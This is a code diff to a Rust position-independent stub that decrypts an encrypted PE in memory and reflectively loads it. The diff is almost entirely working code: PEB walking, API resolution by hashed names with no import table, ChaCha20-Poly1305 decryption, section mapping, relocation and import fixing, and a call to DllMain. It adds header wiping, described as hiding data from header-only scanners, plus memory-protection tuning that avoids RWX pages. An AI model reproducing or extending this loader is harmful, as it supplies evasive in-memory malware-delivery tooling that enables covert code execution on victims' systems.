@@ -28,11 +28,15 @@
 //!
 //! * `0` on success — the reflective PE load completed and `DllMain` returned.
 //! * `usize::MAX` on Poly1305 tag mismatch — output buffer is zeroed first.
-//! * `1` bootstrap resolution failed (PEB walk / exports).
-//! * `2` output-page VirtualAlloc failed.
-//! * `4..=14` reflective_load stage codes (diagnostics; see the stage
-//!   comments in `reflective_load`).
-//! * `1`/`2`/… — PEB-walk failure, alloc failure, or PE-parse failure.
+//! * `1` bootstrap resolution failed (PEB walk / VirtualAlloc / LoadLibraryA /
+//!   GetProcAddress).
+//! * `2` decrypt-buffer VirtualAlloc failed.
+//! * `3` VirtualProtect EAT resolution failed. Fail closed: no mapped image is
+//!   allocated, so there is no RWX leftover to pretend-succeed with.
+//! * `4..=14` reflective_load parse / map / reloc / import stage codes
+//!   (diagnostics; see the stage comments in `reflective_load`).
+//! * `15` section (or header) VirtualProtect failed after the image was mapped
+//!   RW. Fail closed: `DllMain` is not called; the image is left RW, never RWX.
 //!
 //! The host-side loader probe harness (`tools/loader_probe_dll`) interprets any
 //! return as `OK rv=<N>` and relies on its Vectored Exception Handler for
@@ -44,15 +48,18 @@
 //! 1. **PEB walk** (`gs:[0x60]` → PEB → Ldr → InLoadOrderModuleList) — find
 //!    `kernel32.dll` by djb2 hash of `BaseDllName`, then walk its export
 //!    address table to resolve `VirtualAlloc`, `LoadLibraryA`,
-//!    `GetProcAddress`.
+//!    `GetProcAddress`, `VirtualProtect`. No IAT: every API is hashed.
 //! 2. **Allocate** — `VirtualAlloc(NULL, ct_len, MEM_COMMIT|MEM_RESERVE,
-//!    PAGE_EXECUTE_READWRITE)` for the decrypted image.
+//!    PAGE_READWRITE)` for the decrypted PE *file* bytes (never executed).
+//!    The mapped image is a second RW allocation of `SizeOfImage`.
 //! 3. **Decrypt** — ChaCha20-Poly1305 (RFC 8439) composed by hand from the
 //!    `chacha20` + `poly1305` primitives (no `alloc`). On tag mismatch: zero
 //!    the buffer and return `usize::MAX`.
-//! 4. **Reflective load** — map sections, apply `IMAGE_REL_BASED_DIR64`
-//!    relocations, resolve imports via `LoadLibraryA` + `GetProcAddress`,
-//!    call `DllMain(base, DLL_PROCESS_ATTACH, NULL)`.
+//! 4. **Reflective load** — copy sections into the RW mapping, apply
+//!    `IMAGE_REL_BASED_DIR64` relocations, resolve imports via `LoadLibraryA`
+//!    + `GetProcAddress`, wipe the mapped DOS+NT+section table, `VirtualProtect`
+//!    each section from `Characteristics` (W+X collapses to RX — no RWX
+//!    steady state), then `DllMain(base, DLL_PROCESS_ATTACH, NULL)`.
 //!
 //! # Panic strategy
 //!
@@ -72,11 +79,18 @@ const HASH_KERNEL32_DLL: u32 = 0x7040EE75;
 const HASH_VIRTUAL_ALLOC: u32 = 0x58DACBD7;
 const HASH_LOAD_LIBRARY_A: u32 = 0x0666395B;
 const HASH_GET_PROC_ADDRESS: u32 = 0x82172F7F;
+const HASH_VIRTUAL_PROTECT: u32 = 0x8B9EBDCD;
 
 const MEM_COMMIT: u32 = 0x1000;
 const MEM_RESERVE: u32 = 0x2000;
-const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+const PAGE_READONLY: u32 = 0x02;
+const PAGE_READWRITE: u32 = 0x04;
+const PAGE_EXECUTE_READ: u32 = 0x20;
 const DLL_PROCESS_ATTACH: u32 = 1;
+
+// PE section Characteristics bits (`winnt.h`).
+const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
+const IMAGE_SCN_MEM_WRITE: u32 = 0x8000_0000;
 
 // ── Win32 types ────────────────────────────────────────────────────────────
 
@@ -88,22 +102,24 @@ type VirtualAllocFn = unsafe extern "system" fn(
     alloc_type: u32,
     protect: u32,
 ) -> *mut c_void;
-type LoadLibraryAFn = unsafe extern "system" fn(lib: *const u8) -> *mut c_void;
-type GetProcAddressFn = unsafe extern "system" fn(
-    module: *const c_void,
-    name: *const u8,
-) -> *mut c_void;
-type DllMainFn = unsafe extern "system" fn(
-    base: *const c_void,
-    reason: u32,
-    reserved: *const c_void,
+type VirtualProtectFn = unsafe extern "system" fn(
+    addr: *mut c_void,
+    size: usize,
+    new_protect: u32,
+    old_protect: *mut u32,
 ) -> i32;
+type LoadLibraryAFn = unsafe extern "system" fn(lib: *const u8) -> *mut c_void;
+type GetProcAddressFn =
+    unsafe extern "system" fn(module: *const c_void, name: *const u8) -> *mut c_void;
+type DllMainFn =
+    unsafe extern "system" fn(base: *const c_void, reason: u32, reserved: *const c_void) -> i32;
 
 // ── Resolved bootstrap APIs ────────────────────────────────────────────────
 
 #[derive(Clone, Copy)]
 struct Bootstrap {
     virtual_alloc: VirtualAllocFn,
+    virtual_protect: VirtualProtectFn,
     load_library_a: LoadLibraryAFn,
     get_proc_address: GetProcAddressFn,
 }
@@ -219,7 +235,9 @@ unsafe fn peb_pointer() -> *mut Peb {
 fn djb2_ascii(name: &[u8]) -> u32 {
     let mut h: u32 = 5381;
     for &b in name {
-        h = h.wrapping_mul(33).wrapping_add(b.to_ascii_lowercase() as u32);
+        h = h
+            .wrapping_mul(33)
+            .wrapping_add(b.to_ascii_lowercase() as u32);
     }
     h
 }
@@ -230,7 +248,9 @@ fn djb2_utf16_low(units: &[u16]) -> u32 {
     let mut h: u32 = 5381;
     for &u in units {
         let lo = (u & 0xFF) as u8;
-        h = h.wrapping_mul(33).wrapping_add(lo.to_ascii_lowercase() as u32);
+        h = h
+            .wrapping_mul(33)
+            .wrapping_add(lo.to_ascii_lowercase() as u32);
     }
     h
 }
@@ -239,23 +259,28 @@ fn djb2_utf16_low(units: &[u16]) -> u32 {
 
 /// Walk InLoadOrderModuleList looking for `kernel32.dll` (by hash of
 /// `BaseDllName`), then walk its export table to resolve `VirtualAlloc`,
-/// `LoadLibraryA`, `GetProcAddress`. Returns `None` on any failure.
+/// `LoadLibraryA`, `GetProcAddress`, `VirtualProtect`.
+///
+/// Returns `Err(1)` on PEB-walk / VA / LLA / GPA failure, `Err(3)` if
+/// `VirtualProtect` cannot be resolved (fail closed — never map RWX and
+/// pretend success).
 ///
 /// # Safety
 /// Must run in a Windows user-mode thread (GS segment → TEB).
-unsafe fn resolve_bootstrap() -> Option<Bootstrap> {
+unsafe fn resolve_bootstrap() -> Result<Bootstrap, u8> {
     // SAFETY: caller guarantees Windows user-mode context.
     let peb = unsafe { peb_pointer() };
     if peb.is_null() {
-        return None;
+        return Err(1);
     }
     let ldr = unsafe { (*peb).ldr };
     if ldr.is_null() {
-        return None;
+        return Err(1);
     }
     // The list head is a node whose flink points at the first entry; walk until
     // we come back to the head (sentinel). Guard cap against a corrupted list.
-    let list_head: *const ListEntry = unsafe { core::ptr::addr_of!((*ldr).in_load_order_module_list) };
+    let list_head: *const ListEntry =
+        unsafe { core::ptr::addr_of!((*ldr).in_load_order_module_list) };
     let mut node = unsafe { (*ldr).in_load_order_module_list.flink };
     let mut guard = 0u32;
     while !core::ptr::eq(node, list_head) && guard < 1024 {
@@ -278,18 +303,26 @@ unsafe fn resolve_bootstrap() -> Option<Bootstrap> {
                     let va_ptr = unsafe { export_by_hash(dll_base, HASH_VIRTUAL_ALLOC) };
                     let lla_ptr = unsafe { export_by_hash(dll_base, HASH_LOAD_LIBRARY_A) };
                     let gpa_ptr = unsafe { export_by_hash(dll_base, HASH_GET_PROC_ADDRESS) };
+                    let vp_ptr = unsafe { export_by_hash(dll_base, HASH_VIRTUAL_PROTECT) };
                     // Reject null resolutions defensively — calling a null fn
                     // pointer would crash.
                     if va_ptr.is_null() || lla_ptr.is_null() || gpa_ptr.is_null() {
-                        return None;
+                        return Err(1);
+                    }
+                    if vp_ptr.is_null() {
+                        // Fail closed: never allocate the image RWX as a
+                        // fallback and claim success.
+                        return Err(3);
                     }
                     // SAFETY: raw pointer → extern "system" fn via transmute
                     // (a direct `as` cast is rejected by the compiler).
                     let va: VirtualAllocFn = unsafe { core::mem::transmute(va_ptr) };
+                    let vp: VirtualProtectFn = unsafe { core::mem::transmute(vp_ptr) };
                     let lla: LoadLibraryAFn = unsafe { core::mem::transmute(lla_ptr) };
                     let gpa: GetProcAddressFn = unsafe { core::mem::transmute(gpa_ptr) };
-                    return Some(Bootstrap {
+                    return Ok(Bootstrap {
                         virtual_alloc: va,
+                        virtual_protect: vp,
                         load_library_a: lla,
                         get_proc_address: gpa,
                     });
@@ -299,7 +332,7 @@ unsafe fn resolve_bootstrap() -> Option<Bootstrap> {
         // SAFETY: entry is a valid LdrEntry; flink is the next node.
         node = unsafe { (*entry).in_load_order_links.flink };
     }
-    None
+    Err(1)
 }
 
 /// Parse a module base pointer's export directory and resolve a function by
@@ -343,10 +376,8 @@ unsafe fn export_by_hash(base: *mut u8, hash: u32) -> *mut c_void {
         return core::ptr::null_mut();
     }
     let names = unsafe { base.add((*dir).address_of_names as usize) as *const u32 };
-    let ordinals =
-        unsafe { base.add((*dir).address_of_name_ordinals as usize) as *const u16 };
-    let funcs =
-        unsafe { base.add((*dir).address_of_functions as usize) as *const u32 };
+    let ordinals = unsafe { base.add((*dir).address_of_name_ordinals as usize) as *const u16 };
+    let funcs = unsafe { base.add((*dir).address_of_functions as usize) as *const u32 };
     for i in 0..n {
         // SAFETY: i < n ⇒ within the names table.
         let name_rva = unsafe { core::ptr::read(names.add(i)) };
@@ -363,7 +394,9 @@ unsafe fn export_by_hash(base: *mut u8, hash: u32) -> *mut c_void {
             if c == 0 {
                 break;
             }
-            h = h.wrapping_mul(33).wrapping_add(c.to_ascii_lowercase() as u32);
+            h = h
+                .wrapping_mul(33)
+                .wrapping_add(c.to_ascii_lowercase() as u32);
             p = unsafe { p.add(1) };
         }
         if h == hash {
@@ -399,8 +432,8 @@ unsafe fn export_by_hash(base: *mut u8, hash: u32) -> *mut c_void {
 // This avoids the `aead::Aead` trait's `Vec`-returning API so no allocator is
 // required.
 
-use chacha20::ChaCha20;
 use chacha20::cipher::{KeyInit, KeyIvInit, StreamCipher};
+use chacha20::ChaCha20;
 use poly1305::universal_hash::UniversalHash;
 use poly1305::Poly1305;
 
@@ -453,8 +486,8 @@ unsafe fn chacha20poly1305_decrypt(
     // ── 2. Compute the Poly1305 tag over the constructed MAC input. ───────
     //   mac_input = pad16(aad) || pad16(ciphertext) || u64le(aad_len) || u64le(ct_len)
     // aad is empty here, so pad16(aad) is empty.
-    let mut poly = Poly1305::new_from_slice(&poly_key_block[..32])
-        .expect("poly1305 key is always 32 bytes");
+    let mut poly =
+        Poly1305::new_from_slice(&poly_key_block[..32]).expect("poly1305 key is always 32 bytes");
     // update_padded handles pad16 internally for variable-length input.
     poly.update_padded(&ct_sl[..ct_len]);
     // Lengths block: two u64 little-endian values = one 16-byte Poly1305 block.
@@ -491,10 +524,26 @@ unsafe fn chacha20poly1305_decrypt(
 // implementation). Runs entirely against the in-memory decrypted image: parses
 // PE headers, copies sections to their virtual offsets, applies
 // IMAGE_REL_BASED_DIR64 relocations, resolves imports via the resolved
-// `LoadLibraryA` + `GetProcAddress`, then calls DllMain.
+// `LoadLibraryA` + `GetProcAddress`, wipes mapped headers, VirtualProtects
+// each section, then calls DllMain.
 
 const IMAGE_REL_BASED_ABSOLUTE: u16 = 0;
 const IMAGE_REL_BASED_DIR64: u16 = 10;
+
+/// Map PE section `Characteristics` to the final `VirtualProtect` value.
+///
+/// Nyx policy is no RWX steady state: EXECUTE+WRITE collapses to RX after
+/// the write phase (copy / reloc / IAT). Must stay in lockstep with
+/// `nyx_loader::on_target::section_protect_from_characteristics`.
+fn section_protect_from_characteristics(characteristics: u32) -> u32 {
+    if characteristics & IMAGE_SCN_MEM_EXECUTE != 0 {
+        PAGE_EXECUTE_READ
+    } else if characteristics & IMAGE_SCN_MEM_WRITE != 0 {
+        PAGE_READWRITE
+    } else {
+        PAGE_READONLY
+    }
+}
 
 #[repr(C)]
 #[derive(Clone, Copy)]
@@ -621,9 +670,7 @@ unsafe fn reflective_load(image: &[u8], boot: &Bootstrap) -> u8 {
         return 7;
     }
     let file_hdr_off = nt_off + 4;
-    let file = unsafe {
-        &*(image.as_ptr().add(file_hdr_off) as *const ImageFileHeader)
-    };
+    let file = unsafe { &*(image.as_ptr().add(file_hdr_off) as *const ImageFileHeader) };
     let opt_off = file_hdr_off + 20;
     if file.size_of_optional_header < 240 {
         return 8;
@@ -648,14 +695,17 @@ unsafe fn reflective_load(image: &[u8], boot: &Bootstrap) -> u8 {
     let entry_rva = opt.address_of_entry_point as usize;
     let size_of_headers = opt.size_of_headers as usize;
 
-    // ── 1. Allocate the image base via VirtualAlloc (RWX). ────────────────
+    // ── 1. Allocate the image base via VirtualAlloc (RW). ─────────────────
+    // Writes (headers, sections, relocs, IAT, header wipe) happen while the
+    // mapping is RW. Per-section VirtualProtect runs before DllMain; there
+    // is no RWX steady state (W+X Characteristics collapse to RX).
     // SAFETY: boot.virtual_alloc is a live kernel32 export.
     let base = unsafe {
         (boot.virtual_alloc)(
             core::ptr::null(),
             size_of_image,
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE,
+            PAGE_READWRITE,
         )
     };
     if base.is_null() {
@@ -678,9 +728,7 @@ unsafe fn reflective_load(image: &[u8], boot: &Bootstrap) -> u8 {
     }
     for i in 0..n_sect {
         let s_off = sect_off + i * 40;
-        let sec = unsafe {
-            &*(image.as_ptr().add(s_off) as *const ImageSectionHeader)
-        };
+        let sec = unsafe { &*(image.as_ptr().add(s_off) as *const ImageSectionHeader) };
         let va = sec.virtual_address as usize;
         let vsize = sec.virtual_size as usize;
         let raw_off = sec.pointer_to_raw_data as usize;
@@ -702,8 +750,7 @@ unsafe fn reflective_load(image: &[u8], boot: &Bootstrap) -> u8 {
             continue;
         }
         let copy_len = dst_len.min(raw_size);
-        mapped[va..va + copy_len]
-            .copy_from_slice(&image[raw_off..raw_off + copy_len]);
+        mapped[va..va + copy_len].copy_from_slice(&image[raw_off..raw_off + copy_len]);
     }
 
     // ── 4. Apply DIR64 base relocations (delta = base - preferred). ───────
@@ -724,7 +771,12 @@ unsafe fn reflective_load(image: &[u8], boot: &Bootstrap) -> u8 {
             image[opt_off + 112 + 5 * 8 + 7],
         ]);
         if reloc_dir_rva != 0 && reloc_dir_size != 0 {
-            if !apply_relocs(mapped, reloc_dir_rva as usize, reloc_dir_size as usize, delta) {
+            if !apply_relocs(
+                mapped,
+                reloc_dir_rva as usize,
+                reloc_dir_size as usize,
+                delta,
+            ) {
                 return 13;
             }
         }
@@ -750,7 +802,56 @@ unsafe fn reflective_load(image: &[u8], boot: &Bootstrap) -> u8 {
         }
     }
 
-    // ── 6. Call DllMain(base, DLL_PROCESS_ATTACH, NULL). ──────────────────
+    // ── 6. Wipe mapped DOS+NT+section table, then per-section protect. ────
+    // Headers must stay readable through import resolution (done above).
+    // Typical DllMain does not parse PE headers, so wipe before DllMain.
+    // Only the *mapped image* is wiped — never the PIC stub.
+    //
+    // .pdata: do not register a fake exception directory (RtlAddFunctionTable
+    // / a synthetic RUNTIME_FUNCTION table). The PIC dumper refuses images
+    // with IAT/relocs/writable-data refs, and a runtime unwind registration
+    // would also fight CET/shadow stacks. If the mapped PE has an exception
+    // directory, leave the .pdata bytes as the PE mapped them (section perms
+    // apply). Wiping the headers zeros DataDirectory[EXCEPTION] so
+    // header-only scanners do not see a table; DllMain does not consult it.
+    let wipe_len = size_of_headers.min(size_of_image);
+    mapped[..wipe_len].fill(0);
+
+    // Header pages → R. Then each section from Characteristics on `image`
+    // (the decrypt buffer still holds the original headers). Relocs already
+    // ran while the whole image was RW, so no brief RWX window is needed.
+    if size_of_headers > 0 {
+        let mut old = 0u32;
+        let ok = unsafe { (boot.virtual_protect)(base, size_of_headers, PAGE_READONLY, &mut old) };
+        if ok == 0 {
+            return 15;
+        }
+    }
+    for i in 0..n_sect {
+        let s_off = sect_off + i * 40;
+        if s_off + 40 > image.len() {
+            return 15;
+        }
+        let sec = unsafe { &*(image.as_ptr().add(s_off) as *const ImageSectionHeader) };
+        let va = sec.virtual_address as usize;
+        let vsize = sec.virtual_size as usize;
+        if vsize == 0 || va >= size_of_image {
+            continue;
+        }
+        let size = vsize.min(size_of_image - va);
+        if size == 0 {
+            continue;
+        }
+        let prot = section_protect_from_characteristics(sec.characteristics);
+        let mut old = 0u32;
+        let ok =
+            unsafe { (boot.virtual_protect)(base_u8.add(va) as *mut c_void, size, prot, &mut old) };
+        if ok == 0 {
+            return 15;
+        }
+    }
+
+    // ── 7. Call DllMain(base, DLL_PROCESS_ATTACH, NULL). ──────────────────
     let entry_va = base_u8.add(entry_rva);
     // Cast the raw code pointer to the DllMain fn type via transmute (a direct
     // `as` cast pointer→fn is rejected by the compiler).
@@ -849,12 +950,7 @@ impl ImageBaseRelocation {
 /// Resolve the import table: for each descriptor, LoadLibraryA the named DLL
 /// and GetProcAddress each thunk, writing the result into the IAT (mapped in
 /// place at the FirstThunk RVAs).
-fn resolve_imports(
-    mapped: &mut [u8],
-    rva: usize,
-    _size: usize,
-    boot: &Bootstrap,
-) -> bool {
+fn resolve_imports(mapped: &mut [u8], rva: usize, _size: usize, boot: &Bootstrap) -> bool {
     // Each descriptor is 20 bytes; the table is terminated by an all-zero one.
     let mut pos = rva;
     while pos + 20 <= mapped.len() {
@@ -972,8 +1068,8 @@ fn resolve_imports(
                     blen += 1;
                 }
                 buf[blen + 2] = 0; // NUL-terminate
-                // SAFETY: boot.get_proc_address is the live kernel32 export;
-                // buf is a stable stack pointer for the duration of the call.
+                                   // SAFETY: boot.get_proc_address is the live kernel32 export;
+                                   // buf is a stable stack pointer for the duration of the call.
                 unsafe { (boot.get_proc_address)(module, buf[2..].as_ptr()) }
             };
             if addr.is_null() {
@@ -1011,8 +1107,9 @@ unsafe fn load_lib_nul(load_lib: LoadLibraryAFn, name: &[u8]) -> *mut c_void {
 ///   - `ct`      = &ciphertext || tag (r8)
 ///   - `ct_len`  = ciphertext byte count, excludes tag (r9)
 ///
-/// Returns 0 on success, `usize::MAX` on tag mismatch, 1/2/3 on PEB/alloc/PE
-/// failures. See the crate docs for the full table.
+/// Returns 0 on success, `usize::MAX` on tag mismatch, 1/2/3 on PEB/alloc/
+/// VirtualProtect-resolve failures, 4..=15 on reflective_load stages. See
+/// the crate docs for the full table.
 #[no_mangle]
 pub extern "C" fn nyx_layer2_entry(
     key: *const u8,
@@ -1020,21 +1117,22 @@ pub extern "C" fn nyx_layer2_entry(
     ct: *const u8,
     ct_len: usize,
 ) -> usize {
-    // ── 1. PEB walk → resolve VirtualAlloc / LoadLibraryA / GetProcAddress. ──
+    // ── 1. PEB walk → VA / LLA / GPA / VirtualProtect (hashed, no IAT). ──
     // SAFETY: we run in a Windows user-mode thread (GS → TEB).
     let boot = match unsafe { resolve_bootstrap() } {
-        Some(b) => b,
-        None => return 1,
+        Ok(b) => b,
+        Err(c) => return c as usize,
     };
 
-    // ── 2. Allocate the output page (RWX) for the decrypted PE. ────────────
+    // ── 2. Allocate the decrypt buffer (RW) for the PE *file* bytes. ───────
+    // This region is never executed; the mapped image is a second RW alloc.
     // SAFETY: boot.virtual_alloc is a live kernel32 export.
     let out = unsafe {
         (boot.virtual_alloc)(
             core::ptr::null(),
             ct_len,
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE,
+            PAGE_READWRITE,
         )
     };
     if out.is_null() {
